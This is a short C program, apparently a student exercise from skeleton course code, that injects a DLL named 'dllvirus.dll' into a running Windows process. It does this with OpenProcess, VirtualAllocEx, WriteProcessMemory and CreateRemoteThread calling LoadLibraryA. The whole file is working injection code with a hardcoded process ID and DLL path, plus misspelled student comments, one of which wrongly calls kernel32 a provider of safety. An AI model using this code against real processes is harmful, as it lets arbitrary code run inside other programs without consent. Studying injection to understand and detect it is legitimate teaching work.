// Barak Gonen 2019
// Skeleton code - inject DLL to a running process
#include<Windows.h>
#include<stdio.h>
#define PROCNUM  16784
#define path "C:\\Users\\Idang\\source\\repos\\dllvirus\\Release\\dllvirus.dll"
int main()
{

	// Get full path of DLL to inject

	DWORD pathLen = GetFullPathNameA(path, 0, NULL, NULL);
	// Get LoadLibrary function address –
	// the address doesn't change at remote process
	PVOID addrLoadLibrary =
		(PVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"),
			"LoadLibraryA");// the most basic class of win kernel32 that ptovides saftey to the clients and because of that evry program using him 
	if (addrLoadLibrary == NULL) {
		printf("Error");
		// Open remote process
	}
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCNUM);// i just lookef in the msdn what need to be where... i didnt do so much here .....
	// Get a pointer to memory location in remote process,
	// big enough to store DLL path
	LPVOID memAddr = (PVOID)VirtualAllocEx(proc, NULL, pathLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);//get virtual memoery for the dll path in the process 
	if (NULL == memAddr) {
		DWORD err = GetLastError();
		printf("1 %d", err);
		return 0;
	}
	// Write DLL name to remote process memory
	BOOL check = WriteProcessMemory(proc, memAddr, path, pathLen, NULL);// write the path into taht memeory 
	if (0 == check) {
		DWORD err = GetLastError();
		printf("2 %d", err);
		return 0;
	}
	// Open remote thread, while executing LoadLibrary
	// with parameter DLL name, will trigger DLLMain
	HANDLE hRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)addrLoadLibrary, memAddr, NULL, NULL);//mannge the inject and the all thing and active it 
	if (NULL == hRemote) {
		DWORD err = GetLastError();
		printf("3 %d", err);
		return 0;
	}
	WaitForSingleObject(hRemote, INFINITE);
	check = CloseHandle(hRemote);
	return 0;
}